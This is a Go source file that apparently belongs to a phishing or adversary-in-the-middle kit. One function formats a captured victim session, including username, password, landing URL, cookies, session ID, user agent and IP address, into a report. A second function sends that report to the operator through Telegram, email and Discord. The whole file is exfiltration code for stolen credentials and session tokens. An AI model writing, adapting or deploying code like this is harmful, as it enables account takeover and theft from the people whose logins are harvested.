package main

import (
	"encoding/json"
	"fmt"
)

func formatSessionMessage(session Session) string {
	tokensJSON, _ := json.MarshalIndent(session.Tokens, "", "  ")

	return fmt.Sprintf("**Session Information**\n\n"+
		"Username:      ➖ %s\n"+
		"Password:      ➖ %s\n"+
		"Landing URL:   ➖ %s\n \n"+

		"Cookies:        ➖ \n ``` \n [ %s ] \n ``` \n "+
		"Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n \n"+

		"User Agent:    ➖ %s\n"+
		"Remote Address:➖ %s\n"+
		"Create Time:   ➖ %d\n",
		session.Username,
		session.Password,
		session.LandingURL,
		string(tokensJSON), // Printing formatted JSON strings
		session.SessionID,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
	}
	message := formatSessionMessage(session)
	fmt.Printf("------------------------------------------------------\n")
	fmt.Printf("Session:\n")
	fmt.Printf(message)
	fmt.Printf("------------------------------------------------------\n")

	if config.TelegramEnable {

		sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message)
		if err != nil {
			fmt.Printf("Error sending Telegram notification: %v\n", err)
		}
	}

	if config.MailEnable {
		err := sendMailNotification(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message)
		if err != nil {
			fmt.Printf("Error sending Mail notification: %v\n", err)
		}
	}

	if config.DiscordEnable {
		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message)

	}
}
